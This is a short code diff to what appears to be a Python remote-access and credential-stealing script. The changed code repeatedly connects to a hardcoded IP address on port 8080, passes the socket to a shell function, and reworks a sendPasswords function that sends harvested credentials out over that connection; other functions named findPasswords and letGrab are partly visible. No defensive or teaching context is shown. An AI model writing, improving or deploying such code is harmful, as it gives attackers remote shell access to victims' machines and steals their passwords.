@@ -21,7 +21,7 @@ def tuneConnection():
     while True:
         time.sleep(5)
         try:
-            mySocket.connect(("192.168.23.128", 8080))  # Insert IP address here
+            mySocket.connect(("192.168.21.128", 8080))  # Insert IP address here
             shell(mySocket)
 
         except:
@@ -46,12 +46,11 @@ def findPasswords(directory):
 
 
 def sendPasswords(mySocket, passwords):
+    list_pass = []
     for row in passwords:
-        password_data = ','.join(map(str, row))
-        mySocket.send(f"Credentials: {password_data}".encode())
-    #for password in passwords:
-    #mySocket.send(f"Credentials: {password}".encode())
-
+        print(row)
+        list_pass.append(row)
+    mySocket.send(f"Credentials: {list_pass}".encode())
 
 def letGrab(mySocket, path):
     if os.path.exists(path):
